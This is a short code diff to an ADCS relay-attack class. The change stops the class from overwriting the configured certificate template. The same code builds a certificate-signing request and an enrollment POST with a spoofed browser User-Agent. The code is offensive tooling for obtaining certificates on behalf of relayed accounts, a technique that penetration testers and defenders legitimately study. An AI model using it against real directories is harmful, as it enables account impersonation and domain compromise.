@@ -33,14 +33,15 @@ class ADCSAttack:
             LOG.info('Skipping user %s since attack was already performed' % self.username)
             return
 
-        if self.config.template is None:
-            self.config.template = "Machine" if self.username.endswith("$") else "User"
+        current_template = self.config.template
+        if current_template is None:
+            current_template = "Machine" if self.username.endswith("$") else "User"
 
         csr = self.generate_csr(key, self.username)
         csr = csr.decode().replace("\n", "").replace("+", "%2b").replace(" ", "+")
         LOG.info("CSR generated!")
 
-        data = "Mode=newreq&CertRequest=%s&CertAttrib=CertificateTemplate:%s&TargetStoreFlags=0&SaveCert=yes&ThumbPrint=" % (csr, self.config.template)
+        data = "Mode=newreq&CertRequest=%s&CertAttrib=CertificateTemplate:%s&TargetStoreFlags=0&SaveCert=yes&ThumbPrint=" % (csr, current_template)
 
         headers = {
             "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
